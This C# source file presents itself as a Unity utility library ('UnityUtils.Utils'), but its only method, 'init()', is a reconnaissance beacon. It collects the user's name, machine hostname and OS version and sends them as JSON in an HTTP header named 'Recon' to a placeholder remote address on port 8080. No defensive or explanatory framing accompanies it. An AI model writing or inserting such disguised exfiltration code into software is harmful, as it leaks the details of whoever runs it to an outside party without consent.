using System;
using System.Net.Http;
using Newtonsoft.Json;

namespace UnityUtils
{
    public struct Data
    {
        public string username;
        public string hostname;
        public string os_version;
    }
    public class Utils
    {
        public static async void init()
        {
            string url = "http://x.x.x.x:8080";

            Data data = new Data
            {
                username = Environment.UserName,
                hostname = Environment.MachineName,
                os_version = Environment.OSVersion.ToString()
            };

            string json = JsonConvert.SerializeObject(data);

            using (HttpClient client = new HttpClient())
            {
                using (HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url))
                {
                    request.Headers.Add("Recon", json);
                    HttpResponseMessage response = await client.SendAsync(request);
                }
            }  
        }
    }
}
